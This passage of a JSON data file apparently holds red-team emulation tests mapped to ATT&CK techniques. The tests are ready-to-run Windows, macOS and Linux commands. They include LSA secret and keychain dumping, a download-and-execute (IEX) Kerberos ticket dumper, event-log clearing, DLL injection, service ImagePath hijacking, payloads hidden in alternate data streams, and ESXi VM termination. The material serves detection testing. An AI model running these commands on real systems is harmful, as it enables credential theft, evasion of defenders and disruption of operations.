		"attack_technique": "T1033",
		"phases": ["discovery"]
	},
	{
		"name": "User Discovery With Env Vars PowerShell Script",
		"auto_generated_guid": "dcb6cdee-1fb0-4087-8bf8-88cfd136ba51",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "[System.Environment]::UserName | Out-File -FilePath .\\CurrentactiveUser.txt \n$env:UserName | Out-File -FilePath .\\CurrentactiveUser.txt -Append\n",
			"cleanup_command": "Remove-Item -Path .\\CurrentactiveUser.txt -Force\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1033",
		"phases": ["discovery"]
	},
	{
		"name": "GetCurrent User with PowerShell Script",
		"auto_generated_guid": "1392bd0f-5d5a-429e-81d9-eb9d4d4d5b3b",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\\CurrentUserObject.txt\n",
			"cleanup_command": "Remove-Item -Path .\\CurrentUserObject.txt -Force\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1033",
		"phases": ["discovery"]
	},
	{
		"name": "System Discovery - SocGholish whoami",
		"auto_generated_guid": "3d257a03-eb80-41c5-b744-bb37ac7f65c7",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"output_path": {
				"description": "Location of output file",
				"type": "string",
				"default": "$env:temp"
			}
		},
		"executor": {
			"command": "$TokenSet = @{\n  U = [Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ'\n  N = [Char[]]'0123456789'\n}\n$Upper = Get-Random -Count 5 -InputObject $TokenSet.U\n$Number = Get-Random -Count 5 -InputObject $TokenSet.N\n$StringSet = $Upper + $Number\n$rad = (Get-Random -Count 5 -InputObject $StringSet) -join ''\n$file = \"rad\" + $rad + \".tmp\"\n\nwhoami.exe /all >> #{output_path}\\$file\n",
			"cleanup_command": "Remove-Item -Path #{output_path}\\rad*.tmp -Force\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1033",
		"phases": ["discovery"]
	},
	{
		"name": "System Owner/User Discovery Using Command Prompt",
		"auto_generated_guid": "ba38e193-37a6-4c41-b214-61b33277fe36",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"output_file_path": {
				"description": "Location of output file.",
				"type": "string",
				"default": "$env:temp"
			}
		},
		"executor": {
			"name": "command_prompt",
			"elevation_required": false,
			"command": "set file=#{output_file_path}\\user_info_%random%.tmp\necho Username: %USERNAME% > %file%\necho User Domain: %USERDOMAIN% >> %file%\nnet users >> %file%\nquery user >> %file%\n",
			"cleanup_command": "del #{output_file_path}\\\\user_info_*.tmp\n"
		},
		"attack_technique": "T1033",
		"phases": ["discovery"]
	},
	{
		"name": "Hidden Window",
		"auto_generated_guid": "f151ee37-9e2b-47e6-80e4-550b9f999b7a",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"powershell_command": {
				"description": "Command to launch calc.exe from a hidden PowerShell Window",
				"type": "string",
				"default": "powershell.exe -WindowStyle hidden calc.exe"
			}
		},
		"executor": {
			"command": "Start-Process #{powershell_command}\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1564.003",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Headless Browser Accessing Mockbin",
		"auto_generated_guid": "0ad9ab92-c48c-4f08-9b20-9633277c4646",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"bin_id": {
				"description": "Mockbin.org BIN ID",
				"type": "string",
				"default": "f6b9a876-a826-4ac0-83b8-639d6ad516ec"
			},
			"browser": {
				"description": "Browser to use (msedge, chrome, firefox)",
				"type": "string",
				"default": "chrome"
			}
		},
		"executor": {
			"command": "start \"\" #{browser} --headless --disable-gpu https://mockbin.org/bin/#{bin_id}\n",
			"cleanup_command": "taskkill /im #{browser} /f\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1564.003",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Dumping LSA Secrets",
		"auto_generated_guid": "55295ab0-a703-433b-9ca4-ae13807de12f",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"psexec_exe": {
				"description": "Path to PsExec executable",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1003.004\\bin\\PsExec.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "PsExec from Sysinternals must exist on disk at specified location (#{psexec_exe})",
				"prereq_command": "if (Test-Path \"#{psexec_exe}\") {exit 0} else {exit 1}",
				"get_prereq_command": "Invoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PSTools.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\PSTools.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PSTools\" -Force\nNew-Item -ItemType Directory (Split-Path \"#{psexec_exe}\") -Force | Out-Null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\PSTools\\PsExec.exe\" \"#{psexec_exe}\" -Force"
			}
		],
		"executor": {
			"command": "\"#{psexec_exe}\" -accepteula -s reg save HKLM\\security\\policy\\secrets %temp%\\secrets /y\n",
			"cleanup_command": "del %temp%\\secrets >nul 2> nul",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1003.004",
		"phases": ["credential-access"]
	},
	{
		"name": "Dump Kerberos Tickets from LSA using dumper.ps1",
		"auto_generated_guid": "2dfa3bff-9a27-46db-ab75-7faefdaca732",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1')  \n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1003.004",
		"phases": ["credential-access"]
	},
	{
		"name": "Clear Logs",
		"auto_generated_guid": "e6abb60e-26b8-41da-8aae-0c35174b0967",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"log_name": {
				"description": "Windows Log Name, ex System",
				"type": "string",
				"default": "System"
			}
		},
		"executor": {
			"command": "wevtutil cl #{log_name}\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1070.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Delete System Logs Using Clear-EventLog",
		"auto_generated_guid": "b13e9306-3351-4b4b-a6e8-477358b0b498",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$logs = Get-EventLog -List | ForEach-Object {$_.Log}\n$logs | ForEach-Object {Clear-EventLog -LogName $_ }\nGet-EventLog -list\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1070.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Clear Event Logs via VBA",
		"auto_generated_guid": "1b682d84-f075-4f93-9a89-8a8de19ffd6e",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Microsoft Word must be installed\n",
				"prereq_command": "try {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n  Stop-Process -Name \"winword\"\n  exit 0\n} catch { exit 1 }\n",
				"get_prereq_command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n"
			}
		],
		"executor": {
			"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1070.001\\src\\T1070.001-macrocode.txt\" -officeProduct \"Word\" -sub \"ClearLogs\"\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1070.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Hook PowerShell TLS Encrypt/Decrypt Messages",
		"auto_generated_guid": "de1934ea-1fbf-425b-8795-65fb27dd7e33",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"file_name": {
				"description": "Dll To Inject",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1056.004\\bin\\T1056.004x64.dll"
			},
			"server_name": {
				"description": "TLS Server To Test Get Request",
				"type": "url",
				"default": "https://www.example.com"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "T1056.004x64.dll must exist on disk at specified location (#{file_name})\n",
				"prereq_command": "if (Test-Path \"#{file_name}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{file_name}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1056.004/bin/T1056.004x64.dll\" -OutFile \"#{file_name}\" -UseBasicParsing\n"
			}
		],
		"executor": {
			"command": "mavinject $pid /INJECTRUNNING \"#{file_name}\"\nInvoke-WebRequest #{server_name} -UseBasicParsing\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1056.004",
		"phases": ["collection", "credential-access"]
	},
	{
		"name": "Visual Basic script execution to gather local computer information",
		"auto_generated_guid": "1620de42-160a-4fe5-bbaf-d3fef0181ce9",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"vbscript": {
				"description": "Path to sample script",
				"type": "string",
				"default": "PathToAtomicsFolder\\T1059.005\\src\\sys_info.vbs"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Sample script must exist on disk at specified location (#{vbscript})",
				"prereq_command": "if (Test-Path \"#{vbscript}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -ItemType Directory (Split-Path \"#{vbscript}\") -Force | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.005/src/sys_info.vbs\" -OutFile \"#{vbscript}\""
			}
		],
		"executor": {
			"command": "cscript \"#{vbscript}\" > $env:TEMP\\T1059.005.out.txt\n",
			"cleanup_command": "Remove-Item $env:TEMP\\T1059.005.out.txt -ErrorAction Ignore",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1059.005",
		"phases": ["execution"]
	},
	{
		"name": "Encoded VBS code execution",
		"auto_generated_guid": "e8209d5f-e42d-45e6-9c2f-633ac4f1eefa",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "The 64-bit version of Microsoft Office must be installed\n",
				"prereq_command": "try {\n  $wdApp = New-Object -COMObject \"Word.Application\"\n  $path = $wdApp.Path\n  Stop-Process -Name \"winword\"\n  if ($path.contains(\"(x86)\")) { exit 1 } else { exit 0 }\n} catch { exit 1 }\n",
				"get_prereq_command": "Write-Host \"You will need to install Microsoft Word (64-bit) manually to meet this requirement\"\n"
			}
		],
		"executor": {
			"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059.005-macrocode.txt\" -officeProduct \"Word\" -sub \"Exec\"\n",
			"cleanup_command": "Get-WmiObject win32_process | Where-Object {$_.CommandLine -like \"*mshta*\"}  | % { \"$(Stop-Process $_.ProcessID)\" } | Out-Null\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1059.005",
		"phases": ["execution"]
	},
	{
		"name": "Extract Memory via VBA",
		"auto_generated_guid": "8faff437-a114-4547-9a60-749652a03df6",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"ms_product": {
				"description": "Maldoc application Word",
				"type": "string",
				"default": "Word"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Microsoft #{ms_product} must be installed\n",
				"prereq_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
				"get_prereq_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"
			}
		],
		"executor": {
			"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059_005-macrocode.txt\" -officeProduct \"Word\" -sub \"Extract\"\n",
			"cleanup_command": "Remove-Item \"$env:TEMP\\atomic_t1059_005_test_output.bin\" -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1059.005",
		"phases": ["execution"]
	},
	{
		"name": "Service Registry Permissions Weakness",
		"auto_generated_guid": "f7536d63-7fd4-466f-89da-7e48d550752a",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"weak_service_name": {
				"description": "weak service check",
				"type": "string",
				"default": "weakservicename"
			}
		},
		"executor": {
			"command": "get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\* |FL\nget-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name} |FL\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1574.011",
		"phases": ["defense-evasion", "persistence", "privilege-escalation"]
	},
	{
		"name": "Service ImagePath Change with reg.exe",
		"auto_generated_guid": "f38e9eea-e1d7-4ba6-b716-584791963827",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"weak_service_name": {
				"description": "weak service name",
				"type": "string",
				"default": "calcservice"
			},
			"weak_service_path": {
				"description": "weak service path",
				"type": "string",
				"default": "%windir%\\system32\\win32calc.exe"
			},
			"malicious_service_path": {
				"description": "malicious service path",
				"type": "string",
				"default": "%windir%\\system32\\cmd.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "The service must exist (#{weak_service_name})\n",
				"prereq_command": "if (Get-Service #{weak_service_name}) {exit 0} else {exit 1}\n",
				"get_prereq_command": "sc.exe create #{weak_service_name} binpath= \"#{weak_service_path}\"\n"
			}
		],
		"executor": {
			"command": "reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name}\" /f /v ImagePath /d \"#{malicious_service_path}\"\n",
			"cleanup_command": "sc.exe delete #{weak_service_name}\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1574.011",
		"phases": ["defense-evasion", "persistence", "privilege-escalation"]
	},
	{
		"name": "Alternate Data Streams (ADS)",
		"auto_generated_guid": "8822c3b0-d9f9-4daf-a043-49f4602364f4",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"path": {
				"description": "Path of ADS file",
				"type": "path",
				"default": "c:\\ADS\\"
			}
		},
		"executor": {
			"command": "type C:\\temp\\evil.exe > \"C:\\Program Files (x86)\\TeamViewer\\TeamViewer12_Logfile.log:evil.exe\"\nextrac32 #{path}\\procexp.cab #{path}\\file.txt:procexp.exe\nfindstr /V /L W3AllLov3DonaldTrump #{path}\\procexp.exe > #{path}\\file.txt:procexp.exe\ncertutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\\temp:ttt\nmakecab #{path}\\autoruns.exe #{path}\\cabtest.txt:autoruns.cab\nprint /D:#{path}\\file.txt:autoruns.exe #{path}\\Autoruns.exe\nreg export HKLM\\SOFTWARE\\Microsoft\\Evilreg #{path}\\file.txt:evilreg.reg\nregedit /E #{path}\\file.txt:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey\nexpand \\\\webdav\\folder\\file.bat #{path}\\file.txt:file.bat\nesentutl.exe /y #{path}\\autoruns.exe /d #{path}\\file.txt:autoruns.exe /o \n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1564.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Store file in Alternate Data Stream (ADS)",
		"auto_generated_guid": "2ab75061-f5d5-4c1a-b666-ba2a50df5b02",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"payload_path": {
				"description": "Path of file to hide in ADS",
				"type": "path",
				"default": "c:\\windows\\system32\\cmd.exe"
			},
			"ads_file_path": {
				"description": "Path of file to create an ADS under",
				"type": "path",
				"default": "C:\\Users\\Public\\Libraries\\yanki\\desktop.ini"
			},
			"ads_name": {
				"description": "Name of ADS",
				"type": "string",
				"default": "desktop.ini"
			}
		},
		"executor": {
			"command": "if (!(Test-Path C:\\Users\\Public\\Libraries\\yanki -PathType Container)) {\n    New-Item -ItemType Directory -Force -Path C:\\Users\\Public\\Libraries\\yanki\n    }\nStart-Process -FilePath \"$env:comspec\" -ArgumentList \"/c,type,#{payload_path},>,`\"#{ads_file_path}:#{ads_name}`\"\"\n",
			"cleanup_command": "Remove-Item \"#{ads_file_path}\" -Force -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1564.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Create ADS command prompt",
		"auto_generated_guid": "17e7637a-ddaf-4a82-8622-377e20de8fdb",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"file_name": {
				"description": "File name of file to create ADS on.",
				"type": "string",
				"default": "%temp%\\T1564.004_has_ads_cmd.txt"
			},
			"ads_filename": {
				"description": "Name of ADS.",
				"type": "string",
				"default": "adstest.txt"
			}
		},
		"executor": {
			"command": "echo cmd /c echo \"Shell code execution.\"> #{file_name}:#{ads_filename}\nfor /f \"usebackq delims=?\" %i in (#{file_name}:#{ads_filename}) do %i\n",
			"cleanup_command": "del #{file_name} >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1564.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Create ADS PowerShell",
		"auto_generated_guid": "0045ea16-ed3c-4d4c-a9ee-15e44d1560d1",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"file_name": {
				"description": "File name of file to create ADS on.",
				"type": "string",
				"default": "$env:TEMP\\T1564.004_has_ads_powershell.txt"
			},
			"ads_filename": {
				"description": "Name of ADS file.",
				"type": "string",
				"default": "adstest.txt"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "The file must exist on disk at specified location (#{file_name})\n",
				"prereq_command": "if (Test-Path #{file_name}) { exit 0 } else { exit 1 }\n",
				"get_prereq_command": "New-Item -Path #{file_name} | Out-Null\n"
			}
		],
		"executor": {
			"command": "echo \"test\" > #{file_name} | set-content -path test.txt -stream #{ads_filename} -value \"test\"\nset-content -path #{file_name} -stream #{ads_filename} -value \"test2\"\nset-content -path . -stream #{ads_filename} -value \"test3\"\n",
			"cleanup_command": "Remove-Item -Path #{file_name} -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1564.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Create Hidden Directory via $index_allocation",
		"auto_generated_guid": "3e6791e7-232c-481c-a680-a52f86b83fdf",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"folder_name": {
				"description": "File name of file to create inside the folder.",
				"type": "string",
				"default": "%temp%\\...$.......::$index_allocation"
			},
			"hidden_filename": {
				"description": "Name of the files containing the hidden information",
				"type": "string",
				"default": "secrets.txt"
			}
		},
		"executor": {
			"command": "md #{folder_name}\necho too many secrets > #{folder_name}\\#{hidden_filename}\n",
			"cleanup_command": "rmdir /S /Q #{folder_name} >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1564.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Shutdown System - Windows",
		"auto_generated_guid": "ad254fa8-45c0-403b-8c77-e00b3d3e7a64",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"timeout": {
				"description": "Timeout period before shutdown (seconds)",
				"type": "integer",
				"default": 1
			}
		},
		"executor": {
			"command": "shutdown /s /t #{timeout}\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1529",
		"phases": ["impact"]
	},
	{
		"name": "Restart System - Windows",
		"auto_generated_guid": "f4648f0d-bf78-483c-bafc-3ec99cd1c302",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"timeout": {
				"description": "Timeout period before restart (seconds)",
				"type": "integer",
				"default": 1
			}
		},
		"executor": {
			"command": "shutdown /r /t #{timeout}\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1529",
		"phases": ["impact"]
	},
	{
		"name": "Restart System via `shutdown` - FreeBSD/macOS/Linux",
		"auto_generated_guid": "6326dbc4-444b-4c04-88f4-27e94d0327cb",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"timeout": {
				"description": "Time to restart (can be minutes or specific time)",
				"type": "string",
				"default": "now"
			}
		},
		"executor": {
			"command": "shutdown -r #{timeout}\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1529",
		"phases": ["impact"]
	},
	{
		"name": "Shutdown System via `shutdown` - FreeBSD/macOS/Linux",
		"auto_generated_guid": "4963a81e-a3ad-4f02-adda-812343b351de",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"timeout": {
				"description": "Time to shutdown (can be minutes or specific time)",
				"type": "string",
				"default": "now"
			}
		},
		"executor": {
			"command": "shutdown -h #{timeout}\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1529",
		"phases": ["impact"]
	},
	{
		"name": "Restart System via `reboot` - FreeBSD/macOS/Linux",
		"auto_generated_guid": "47d0b042-a918-40ab-8cf9-150ffe919027",
		"supported_platforms": ["linux", "macos"],
		"executor": {
			"command": "reboot\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1529",
		"phases": ["impact"]
	},
	{
		"name": "Shutdown System via `halt` - FreeBSD/Linux",
		"auto_generated_guid": "918f70ab-e1ef-49ff-bc57-b27021df84dd",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "halt -p\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1529",
		"phases": ["impact"]
	},
	{
		"name": "Reboot System via `halt` - FreeBSD",
		"auto_generated_guid": "7b1cee42-320f-4890-b056-d65c8b884ba5",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "halt -r\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1529",
		"phases": ["impact"]
	},
	{
		"name": "Reboot System via `halt` - Linux",
		"auto_generated_guid": "78f92e14-f1e9-4446-b3e9-f1b921f2459e",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "halt --reboot\n",
			"name": "bash",
			"elevation_required": true
		},
		"attack_technique": "T1529",
		"phases": ["impact"]
	},
	{
		"name": "Shutdown System via `poweroff` - FreeBSD/Linux",
		"auto_generated_guid": "73a90cd2-48a2-4ac5-8594-2af35fa909fa",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "poweroff\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1529",
		"phases": ["impact"]
	},
	{
		"name": "Reboot System via `poweroff` - FreeBSD",
		"auto_generated_guid": "5a282e50-86ff-438d-8cef-8ae01c9e62e1",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "poweroff -r 3\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1529",
		"phases": ["impact"]
	},
	{
		"name": "Reboot System via `poweroff` - Linux",
		"auto_generated_guid": "61303105-ff60-427b-999e-efb90b314e41",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "poweroff --reboot\n",
			"name": "bash",
			"elevation_required": true
		},
		"attack_technique": "T1529",
		"phases": ["impact"]
	},
	{
		"name": "Logoff System - Windows",
		"auto_generated_guid": "3d8c25b5-7ff5-4c9d-b21f-85ebd06654a4",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "shutdown /l \n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1529",
		"phases": ["impact"]
	},
	{
		"name": "ESXi - Terminates VMs using pkill",
		"auto_generated_guid": "987c9b4d-a637-42db-b1cb-e9e242c3991b",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"vm_host": {
				"description": "Specify the host name of the ESXi Server",
				"type": "string",
				"default": "atomic.local"
			},
			"vm_user": {
				"description": "Specify the privilege user account on ESXi Server",
				"type": "string",
				"default": "root"
			},
			"vm_pass": {
				"description": "Specify the privilege user password on ESXi Server",
				"type": "string",
				"default": "pass"
			},
			"plink_file": {
				"description": "Path to plink",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe"
			},
			"cli_script": {
				"description": "Path to text with commands",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1529\\src\\esx_pkill.txt"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Check if plink is available.\n",
				"prereq_command": "if (Test-Path \"#{plink_file}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe\" -OutFile \"#{plink_file}\"\n"
			}
		],
		"executor": {
			"command": "echo \"\" | \"#{plink_file}\" \"#{vm_host}\" -ssh  -l \"#{vm_user}\" -pw \"#{vm_pass}\" -m \"#{cli_script}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1529",
		"phases": ["impact"]
	},
	{
		"name": "ESXi - Avoslocker enumerates VMs and forcefully kills VMs",
		"auto_generated_guid": "189f7d6e-9442-4160-9bc3-5e4104d93ece",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"vm_host": {
				"description": "Specify the host name of the ESXi Server",
				"type": "string",
				"default": "atomic.local"
			},
			"vm_user": {
				"description": "Specify the privilege user account on ESXi Server",
				"type": "string",
				"default": "root"
			},
			"vm_pass": {
				"description": "Specify the privilege user password on ESXi Server",
				"type": "string",
				"default": "pass"
			},
			"plink_file": {
				"description": "Path to plink",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe"
			},
			"cli_script": {
				"description": "Path to text with commands",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1529\\src\\esx_avoslocker_kill_vm.txt"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Check if plink is available.\n",
				"prereq_command": "if (Test-Path \"#{plink_file}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe\" -OutFile \"#{plink_file}\"\n"
			}
		],
		"executor": {
			"command": "echo \"\" | \"#{plink_file}\" \"#{vm_host}\" -ssh  -l \"#{vm_user}\" -pw \"#{vm_pass}\" -m \"#{cli_script}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1529",
		"phases": ["impact"]
	},
	{
		"name": "Keychain Dump",
		"auto_generated_guid": "88e1fa00-bf63-4e5b-a3e1-e2ea51c8cca6",
		"supported_platforms": ["macos"],
		"executor": {
			"command": "sudo security dump-keychain -d login.keychain",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1555.001",
		"phases": ["credential-access"]
	},
	{
		"name": "Export Certificate Item(s)",
		"auto_generated_guid": "1864fdec-ff86-4452-8c30-f12507582a93",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"cert_export": {
				"description": "Specify the path of the certificates to export.",
				"type": "path",
				"default": "/tmp/certs.pem"
			}
		},
		"executor": {
			"command": "security find-certificate -a -p > #{cert_export}\n",
			"cleanup_command": "rm #{cert_export}",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1555.001",
		"phases": ["credential-access"]
	},
	{
		"name": "Import Certificate Item(s) into Keychain",
		"auto_generated_guid": "e544bbcb-c4e0-4bd0-b614-b92131635f59",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"cert_export": {
				"description": "Specify the path of the pem certificate file to import.",
				"type": "path",
				"default": "/tmp/certs.pem"
			}
		},
		"executor": {
			"command": "security import #{cert_export} -k\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1555.001",
		"phases": ["credential-access"]
	},
	{
		"name": "Get-EventLog To Enumerate Windows Security Log",
		"auto_generated_guid": "a9030b20-dd4b-4405-875e-3462c6078fdc",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "powershell -c {get-eventlog 'Security' | where {$_.Message -like '*SYSTEM*'} | export-csv $env:temp\\T1654_events.txt}",
			"cleanup_command": "powershell -c \"remove-item $env:temp\\T1654_events.txt -ErrorAction Ignore\"",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1654",
		"phases": ["discovery"]
	},
	{
		"name": "Enumerate Windows Security Log via WevtUtil",
		"auto_generated_guid": "fef0ace1-3550-4bf1-a075-9fea55a778dd",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "wevtutil enum-logs",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1654",
		"phases": ["discovery"]
	},
	{
		"name": "Search files of interest and save them to a single zip file (Windows)",
		"auto_generated_guid": "d3d9af44-b8ad-4375-8b0a-4bff4b7e419c",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"starting_directory": {
				"description": "Path to starting directory for the search",
				"type": "Path",
				"default": "C:\\Users"
			},
			"output_zip_folder_path": {
				"description": "Path to directory for saving the generated zip file",
				"type": "Path",
